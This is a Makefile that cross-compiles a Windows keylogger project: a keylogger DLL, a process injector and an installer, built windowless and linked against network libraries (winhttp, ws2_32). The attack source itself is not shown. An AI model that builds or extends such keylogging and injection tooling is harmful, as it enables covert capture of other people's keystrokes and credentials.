SRCS = keylog/keylogger.c keylog/init_logger.c keylog/sys_getter.c
MINGW_CC = x86_64-w64-mingw32-gcc
CFLAGS ?= -O2 -mwindows
WINLIBS = -luser32 -lpsapi -lws2_32 -lwinhttp -ldxgi

all: injector.exe keylogger.dll installer.exe

injector.exe: keylog/injector.c
	$(MINGW_CC) $(CFLAGS) -o $@ $< $(WINLIBS)

keylogger.dll: $(SRCS) keylog/dllmain.c
	$(MINGW_CC) $(CFLAGS) -shared -o $@ $^ $(WINLIBS)

installer.exe: keylog/installer.c
	$(MINGW_CC) $(CFLAGS) -o $@ $< $(WINLIBS)

clean:
	rm -f *.o *.obj

fclean: clean
	@echo "Cleaning up..."
	rm -f *.exe *.dll

re: fclean all
